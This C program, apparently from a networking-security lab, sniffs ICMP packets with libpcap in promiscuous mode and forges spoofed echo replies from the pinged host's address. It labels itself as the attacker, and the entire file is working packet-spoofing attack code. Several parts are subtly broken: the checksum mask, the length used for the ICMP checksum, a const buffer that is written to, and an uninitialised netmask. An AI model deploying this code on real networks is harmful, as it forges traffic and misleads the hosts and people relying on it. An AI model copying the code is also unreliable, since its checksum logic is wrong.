#include <pcap.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <stdlib.h>

struct ethheader {
	u_char ether_dhost[6];
	u_char ether_shost[6];
	u_short ether_type;
};
struct icmpheader {
	unsigned char icmp_type;
	unsigned char icmp_code;
	unsigned short int icmp_chksum;
	unsigned short int icmp_id;
	unsigned short int icmp_seq;
};
struct ipheader {
	unsigned char iph_ihl:4, iph_ver:4;
	unsigned char iph_tos;
	unsigned short int iph_len;
	unsigned short int iph_ident;
	unsigned short int iph_flag:3, iph_offset:13;
	unsigned char iph_ttl;
	unsigned char iph_protocol;
	unsigned short int iph_chksum;
	struct in_addr iph_sourceip;
	struct in_addr iph_destip;
};
void send_raw_ip_packet (struct ipheader *ip) {
	int sd;
	int enable = 1;
	struct sockaddr_in sin;
	/* Create a raw socket with IP protocol. The IPPROTO_RAW parameter tells the sytem that the IP header is already included;
	* this prevents the OS from adding another IP header. */
	sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
	if(sd < 0) {
		perror("socket() error"); exit(-1);
	}
	// Set socket options
	setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &enable, sizeof(enable));
	/* This data structure is needed when sending the packets using sockets. Normally, we need to fill out several
	* fields, but for raw sockets, we only need to fill out this one field */
	sin.sin_family = AF_INET;
	sin.sin_addr = ip->iph_destip;
	/* Send out the IP packet. ip_len is the actual size of the packet. */
	if(sendto(sd, ip, ntohs(ip->iph_len), 0, (struct sockaddr *)&sin,sizeof(sin)) < 0) {
		perror("sendto() error"); exit(-1);
	}
	else {
		printf(" Packet Sent from Attacker to host:%s\n",inet_ntoa(ip->iph_destip) );
	}
}

unsigned short in_chksum(unsigned short *buf, int length) {
	unsigned short *w = buf;
	int nleft = length;
	int sum = 0;
	unsigned short temp = 0;
	while(nleft > 1) {
		sum+= *w++;
		nleft -=2;
	}
	if (nleft == 1) {
		*(u_char *)(&temp) = *(u_char *)w;
		sum+=temp;
	}
	sum = (sum >> 16) + (sum & 0xfff);
	sum += (sum>>16);
	return (unsigned short)(~sum);
}

void spoof_reply(struct ipheader *ip) {
	const char buffer[1500];
	int ip_header_len = ip->iph_ihl * 4;
	struct icmpheader *icmp = (struct icmpheader *) ((u_char *)ip + ip_header_len);
	if(icmp->icmp_type != 8) return;

	memset((char *)buffer, 0, 1500);
	memcpy((char *)buffer, ip, ntohs(ip->iph_len));
	struct ipheader *newip = (struct ipheader *) buffer;
	struct icmpheader *newicmp = (struct icmpheader *) (buffer + ip_header_len);
	// Fill in the ICMP header
	newicmp->icmp_type=0;
	newicmp->icmp_chksum=0;
	newicmp->icmp_chksum = in_chksum((unsigned short *)icmp, ip_header_len);

	// Fill in the IP header
	newip->iph_ttl = 50;
	newip->iph_sourceip = ip->iph_destip;
	newip->iph_destip = ip->iph_sourceip;
	newip->iph_protocol = IPPROTO_ICMP;
	newip->iph_len=htons(sizeof(struct ipheader) + sizeof(struct icmpheader));
	// Send the spoofed packet
	send_raw_ip_packet(newip);
}

void got_packet(u_char *args, const struct pcap_pkthdr *header,const u_char *packet)
{	
	struct ethheader *eth = (struct ethheader *)packet;
	if (ntohs(eth->ether_type) == 0x0800){
		struct ipheader * ip = (struct ipheader *)(packet + sizeof(struct ethheader));
		int ip_header_len = ip->iph_ihl * 4;
		if (ip->iph_protocol == IPPROTO_ICMP) {
			spoof_reply(ip);
		}
	}
}

int main(){
	pcap_t *handle;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program fp;
	char filter_exp[] = "icmp";
	bpf_u_int32 net;
	// Step 1: Open live pcap session on NIC with name enp0s3
	handle = pcap_open_live("enp0s3", BUFSIZ, 1, 1000, errbuf);
	// Step 2: Compile filter_exp into BPF psuedo-code
	pcap_compile(handle, &fp, filter_exp, 0, net);
	pcap_setfilter(handle, &fp);
	// Step 3: Capture packets
	pcap_loop(handle, -1, got_packet, NULL);
	pcap_close(handle); //Close the handle
	return 0;
}
